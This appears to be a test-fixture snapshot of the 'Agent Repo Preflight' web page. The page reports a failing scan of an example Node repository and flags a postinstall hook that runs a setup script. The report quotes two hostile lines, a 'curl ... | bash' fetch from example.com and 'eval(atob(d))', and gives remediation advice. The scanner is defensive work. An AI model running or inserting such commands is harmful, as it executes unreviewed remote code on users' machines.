@@ -1,0 +1,120 @@
+- generic [active] [ref=e1]:
+  - banner [ref=e2]:
+    - link "⛫ Agent Repo Preflight" [ref=e3] [cursor=pointer]:
+      - /url: /
+    - navigation [ref=e4]:
+      - link "Scan" [ref=e5] [cursor=pointer]:
+        - /url: /
+      - link "Examples" [ref=e6] [cursor=pointer]:
+        - /url: /examples
+      - link "Rules" [ref=e7] [cursor=pointer]:
+        - /url: /rules
+  - main [ref=e8]:
+    - generic [ref=e9]:
+      - generic [ref=e10]: FAIL
+      - generic [ref=e11]:
+        - generic [ref=e12]: Human review required before agent use
+        - generic [ref=e13]:
+          - code [ref=e14]: example:suspicious-node
+          - text: · risk score 28
+      - generic [ref=e15]:
+        - button "Copy link" [ref=e16] [cursor=pointer]
+        - link "JSON" [ref=e17] [cursor=pointer]:
+          - /url: /report/20a9d2ec948ffd99.json
+        - link "Markdown" [ref=e18] [cursor=pointer]:
+          - /url: /report/20a9d2ec948ffd99.md
+    - generic [ref=e19]:
+      - heading "Blast radius" [level=2] [ref=e20]
+      - generic [ref=e21]:
+        - generic [ref=e22]:
+          - generic [ref=e23]: filesystem
+          - generic [ref=e24]: NONE
+        - generic [ref=e25]:
+          - generic [ref=e26]: network
+          - generic [ref=e27]: HIGH
+        - generic [ref=e28]:
+          - generic [ref=e29]: secrets
+          - generic [ref=e30]: NONE
+        - generic [ref=e31]:
+          - generic [ref=e32]: shell
+          - generic [ref=e33]: HIGH
+        - generic [ref=e34]:
+          - generic [ref=e35]: install hooks
+          - generic [ref=e36]: MED
+        - generic [ref=e37]:
+          - generic [ref=e38]: ci
+          - generic [ref=e39]: NONE
+    - generic [ref=e40]:
+      - heading "Findings 3" [level=2] [ref=e41]
+      - generic [ref=e42]:
+        - button "All" [ref=e43] [cursor=pointer]
+        - button "critical (1)" [ref=e44] [cursor=pointer]
+        - button "high (1)" [ref=e45] [cursor=pointer]
+        - button "medium (1)" [ref=e46] [cursor=pointer]
+      - list [ref=e47]:
+        - listitem [ref=e48]:
+          - generic [ref=e49]:
+            - generic [ref=e50]: CRITICAL
+            - generic [ref=e51]: remote-pipe-to-shell
+            - code [ref=e53]: scripts/setup.js:7
+          - generic [ref=e54]: execSync("curl https://example.com/bootstrap.sh | bash");
+          - paragraph [ref=e55]: "`curl ... | bash` (or wget) downloads a remote script and executes it immediately, with no integrity check and no chance to review what runs."
+          - paragraph [ref=e56]:
+            - strong [ref=e57]: "Remediation:"
+            - text: Download the script to a file, read it, and only then run it. Never pipe network output directly into a shell.
+          - generic [ref=e58]:
+            - generic [ref=e59]: network
+            - generic [ref=e60]: shell
+        - listitem [ref=e61]:
+          - generic [ref=e62]:
+            - generic [ref=e63]: HIGH
+            - generic [ref=e64]: base64-decode-exec
+            - code [ref=e66]: scripts/setup.js:13
+          - generic [ref=e67]: r.on("end", () => eval(atob(d)));
+          - paragraph [ref=e68]: "Decoding base64 and immediately executing it (`base64 -d | sh`, `eval(atob(...))`) hides the real payload from casual review."
+          - paragraph [ref=e69]:
+            - strong [ref=e70]: "Remediation:"
+            - text: Decode the payload manually and inspect it before allowing execution.
+          - generic [ref=e72]: shell
+        - listitem [ref=e73]:
+          - generic [ref=e74]:
+            - generic [ref=e75]: MEDIUM
+            - generic [ref=e76]: node-lifecycle-script-present
+            - code [ref=e78]: package.json:6
+          - generic [ref=e79]: node scripts/setup.js
+          - paragraph [ref=e80]: "The package declares an install lifecycle script that executes automatically during `npm install`, before any code is reviewed. Even benign-looking scripts run with the developer's privileges."
+          - paragraph [ref=e81]:
+            - strong [ref=e82]: "Remediation:"
+            - text: "Review the script. Prefer `npm install --ignore-scripts` when onboarding an unfamiliar package."
+          - generic [ref=e83]:
+            - generic [ref=e84]: install hooks
+            - generic [ref=e85]: shell
+    - generic [ref=e86]:
+      - heading "Suspicious setup chains heuristic" [level=2] [ref=e87]
+      - list [ref=e88]:
+        - listitem [ref=e89]:
+          - text: readme instruction
+          - code [ref=e90]: README.md:1
+          - text: README instructs running install/setup
+        - listitem [ref=e91]:
+          - text: lifecycle hook
+          - code [ref=e92]: package.json:6
+          - text: "postinstall: node scripts/setup.js"
+        - listitem [ref=e93]:
+          - text: referenced script
+          - code [ref=e94]: scripts/setup.js:1
+          - text: runs scripts/setup.js
+        - listitem [ref=e95]:
+          - text: dangerous call
+          - code [ref=e96]: scripts/setup.js:7
+          - text: execSync("curl https://example.com/bootstrap.sh | bash");
+        - listitem [ref=e97]:
+          - text: dangerous call
+          - code [ref=e98]: scripts/setup.js:13
+          - text: r.on("end", () => eval(atob(d)));
+    - paragraph [ref=e99]: This tool detects repo-level risk indicators before AI agents execute setup, install, CI, MCP, or instruction files. It does not prove a repository is safe.
+  - contentinfo [ref=e100]:
+    - paragraph [ref=e101]:
+      - text: Detects repo-level risk indicators before AI agents execute setup, install, CI, MCP, or instruction files.
+      - strong [ref=e102]: It does not prove a repository is safe.
+    - paragraph [ref=e103]: Never executes target repository code.
